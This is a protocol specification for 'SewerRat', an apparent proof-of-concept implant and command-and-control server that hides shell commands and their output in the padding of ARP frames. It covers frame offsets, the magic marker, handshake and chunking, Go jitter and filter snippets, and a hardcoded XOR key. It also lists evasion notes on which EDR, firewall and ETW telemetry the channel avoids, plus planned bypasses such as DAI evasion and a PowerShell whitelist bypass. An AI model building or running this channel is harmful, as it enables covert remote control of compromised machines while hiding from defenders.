# SewerRat Protocol Specification

## Overview

SewerRat uses a custom Layer 2 (Data Link) protocol built **on top of ARP** to embed command/response data in Ethernet frame padding. This avoids tcp/udp detection, firewall inspection, and most EDR socket telemetry.

## Frame Structure

### Standard ARP Packet (42 bytes)

```
Offset  Size  Field
------  ----  -----
0       2     Hardware Type (0x0001 = Ethernet)
2       2     Protocol Type (0x0800 = IPv4)
4       1     Hardware Address Length (6)
5       1     Protocol Address Length (4)
6       2     Operation (1=Request, 2=Reply)
8       6     Sender Hardware Address (MAC)
14      4     Sender Protocol Address (IP)
18      6     Target Hardware Address (MAC)
24      4     Target Protocol Address (IP)
```

### Ethernet Frame Padding (22 bytes)

Ethernet requires minimum 64-byte frame. ARP is 42 bytes → 22 bytes padding available.

```
ARP (42 bytes) | Magic Marker (2 bytes) | Payload (20 bytes)
                ^                       ^
                Offset 42               Offset 44
```

**Magic Marker:** `0x13 0x37` (fixed in PoC; should be variable in production)

## Handshake Protocol

### Phase 1: Implant Beacon (Implant → Server)

Implant announces readiness by sending **ARP Request** with:
- **Target IP:** Trigger IP (`10.255.255.254` — non-existent)
- **Padding:** `13 37` + `READY` (ASCII)

```
Frame: ARP Request (Operation=1)
└─ Payload Data: "READY"
└─ Source MAC: Implant's actual MAC
└─ Target IP: 10.255.255.254 (trigger)
```

**Purpose:** Tells server implant is online and listening.

### Phase 2: Command from Server (Server → Implant)

Server responds with **ARP Reply** containing command:
- **Target IP:** Same trigger IP
- **Padding:** `13 37` + command bytes (up to 20 bytes)

```
Frame: ARP Reply (Operation=2)
└─ Payload Data: "whoami" (chunked if >20 bytes)
└─ Source MAC: Server's MAC
└─ Target IP: 10.255.255.254
└─ Destination MAC: Implicit (implant that sent request)
```

**Note:** If command > 20 bytes, server sends first chunk. Implant sends ACK with next beacon, server responds with next chunk.

### Phase 3: Response from Implant (Implant → Server)

Implant executes command and responds with **ARP Reply**:
- **Source MAC:** Implant's MAC
- **Padding:** `13 37` + output (chunked if >20 bytes)

```
Frame: ARP Reply (Operation=2)
└─ Payload Data: Command output
└─ Source Hardware Address: Implant MAC
└─ Sender IP: Implant IP
└─ Destination MAC: Broadcast
```

**Chunking:** Output is split into 20-byte chunks. Each chunk gets a separate ARP frame. Server reassembles by listening for multiple responses.

---

## Payload Encoding

### Single Packet Command (≤20 bytes)

```
Command: "whoami"
┌─────────────────────────────────────────┐
│ Offset │ Bytes            │ Description │
├─────────────────────────────────────────┤
│ 38     │ FF FF FF FF FF FF│ Eth Padding │
│ 42     │ 13 37            │ Magic Marker│
│ 44     │ 77 68 6F 61 6D69 │ "whoami"    │
│ 50     │ 00 00 00 00 ...  │ Null padding│
└─────────────────────────────────────────┘
```

### Multi-Packet Response (>20 bytes)

**Command:** `dir C:\ /s` → Output 150 bytes

```
Chunk 1 (Bytes 0-19):
┌──────────────────────────────┐
│ 13 37 │ ... 20 bytes output...│
└──────────────────────────────┘

Chunk 2 (Bytes 20-39):
┌──────────────────────────────┐
│ 13 37 │ ... 20 bytes output...│
└──────────────────────────────┘

Chunk 3 (Bytes 40-59):
┌──────────────────────────────┐
│ 13 37 │ ... 20 bytes output...│
└──────────────────────────────┘

Chunk 4 (Bytes 60-79):
┌──────────────────────────────┐
│ 13 37 │ ... 20 bytes output...│
└──────────────────────────────┘

Chunk 5 (Bytes 80-149):
┌──────────────────────────────┐
│ 13 37 │ ... 70 bytes output...│
│       │ 00 (null term)        │
└──────────────────────────────┘
```

**Termination:** Null terminator (`0x00`) in final chunk or timeout triggers reassembly.

---

## Magic Marker Detection

Server & implant filter traffic by checking for magic marker at **byte offset 42**:

```go
// Pseudocode filter
func IsC2Traffic(frameData []byte) bool {
    if len(frameData) < 44 {
        return false  // Too short
    }
    return frameData[42] == 0x13 && frameData[43] == 0x37
}
```

**Why in padding?** Padding is ignored by most IDS/monitoring tools. Traditional packet analyzers focus on ARP table changes, not padding bytes.

---

## Jitter & Timing

To avoid detection patterns:

### Server-Side
- Randomize command broadcast intervals: 1-10 seconds
- Vary number of retry requests
- Mix broadcasts with unicast (MAC-specific) sends

### Implant-Side
- Jitter beacon interval: 2-5 seconds between responses
- Inter-chunk delay: 500ms between multi-packet responses
- Randomize command execution time: add 0-500ms delay before execution

**Implementation:**
```go
jitter := time.Duration(rand.Intn(3000) + 2000) * time.Millisecond
time.Sleep(jitter)
```

---

## Encryption (Optional, PoC Stage)

If `EncryptEnabled = true` in `shared/crypto.go`:

### XOR Cipher with Hardcoded Key

```
Plaintext (command):     "whoami"
XOR Key (repeated):      "deadbeef..." (32 bytes)
┌────────────────────────┐
│ Plaintext:  77 68 6F 61 6D 69
│ XOR Key:    DE AD BE EF CA FE
│ Ciphertext: A9 C5 D1 8E A7 87
└────────────────────────┘

// Embedded in padding:
Padding: [13 37] [A9 C5 D1 8E A7 87] [00 ...]
```

**Decryption:** Same XOR operation (XOR^2 = identity).

**Future improvement:** Derive key from target credentials or AD info.

---

## Error Handling

### Timeout (Implant not responding)

```
Server sends: broadcast whoami
Wait: 10 seconds (configurable via -t flag)
Result: [!] No response received (timeout)
```

### Command Execution Timeout

```
Implant receives: powershell Get-Process (long operation)
Timeout: 5 seconds (shared.CommandTimeout)
Returns: "[TIMEOUT] Command did not complete within 5 seconds\n{partial output}"
```

### Invalid Payload

```
Server sends: broadcast <corrupted frame>
Implant receives: Invalid magic marker or decode error
Action: Silently drop (no error response, avoid detection)
```

---

## Detection Evasion Notes

### What EDR/IDS Won't See

- ✓ No TCP/UDP sockets opened (no netstat entries)
- ✓ No Windows firewall rules triggered
- ✓ No WMI/PowerShell events
- ✓ No process network IO in ETW logs
- ✓ No DNS queries

### What EDR/IDS MIGHT See

- ✗ Excessive unsolicited ARP traffic to non-existent IP
- ✗ Single MAC with multiple hardware owner assignments
- ✗ Gratuitous ARP replies with custom payloads
- ✗ Unencrypted payloads visible in pcap dumps

### Evasion Improvements (Future Work)

1. **DAI Bypass:** Use legitimate ARP discovery (not spoofing)
2. **Frame padding noise:** Add random data to padding (entropy)
3. **Trigger IP rotation:** Vary trigger IP per session
4. **Variable magic marker:** Hash target IP + session key
5. **Passive discovery:** Wait for legitimate ARP before sending

---

## Command Reference

### Implant Behavior

| Input | Output | Notes |
|-------|--------|-------|
| `whoami` | `DOMAIN\user` | User context. Also: `id` on Linux |
| `ipconfig /all` | Network interface config | Windows only |
| `cmd /c <cmd>` | Command output | Wrapped in shell |
| `powershell -Command` | PowerShell output | Whitelist bypass |
| Very long command | Split across chunks | Up to 1024 bytes supported |
| Invalid command | `[ERROR] ...` | Error message returned |

### Server Syntax

| Command | Example | Effect |
|---------|---------|--------|
| `broadcast <cmd>` | `broadcast whoami` | Send to all implants on LAN |
| `send <mac> <cmd>` | `send 00:11:22:33:44:55 whoami` | Send to specific MAC |
| `help` | `help` | Show command list |
| `exit` | `exit` | Disconnect and exit |

---

## Performance Characteristics

| Metric | Value | Notes |
|--------|-------|-------|
| Command latency | 2-5 sec | Includes jitter delays |
| Max command size | 1024 bytes | User input limit |
| Max response size | 4096 bytes | Output cap |
| ARP frames per cmd | 1-250 | Depends on output size |
| Network overhead | 100 bytes/cmd | Fixed ARP header |
| Implant RAM usage | 5-10 MB | Go runtime |
| ARP jitter | 2-5 sec | Configurable |

---

## Example Packet Capture (Wireshark)

```
Frame 1: ARP Request
  Ethernet II
    Dest: ff:ff:ff:ff:ff:ff (Broadcast)
    Source: 00:11:22:33:44:55 (Implant)
  Address Resolution Protocol
    Sender MAC: 00:11:22:33:44:55
    Sender IP: 192.168.1.100
    Target MAC: 00:00:00:00:00:00
    Target IP: 10.255.255.254
  [Padding]: 13 37 52 45 41 44 59 ...  (READY)

Frame 2: ARP Reply
  Ethernet II
    Dest: ff:ff:ff:ff:ff:ff
    Source: aa:bb:cc:dd:ee:ff (Server)
  Address Resolution Protocol
    Sender MAC: aa:bb:cc:dd:ee:ff
    Sender IP: 192.168.1.50
    Target MAC: 00:11:22:33:44:55 (Implant)
    Target IP: 10.255.255.254
  [Padding]: 13 37 77 68 6F 61 6D 69 ...  (whoami)

Frame 3: ARP Reply (Response)
  Ethernet II
    Source: 00:11:22:33:44:55
  Address Resolution Protocol
    Target IP: 10.255.255.254
  [Padding]: 13 37 44 4F 4D 41 49 4E 5C 75 73 65 72 ...  (DOMAIN\user)
```

---

For detailed implementation, see `shared/protocol.go` and `shared/constants.go`.
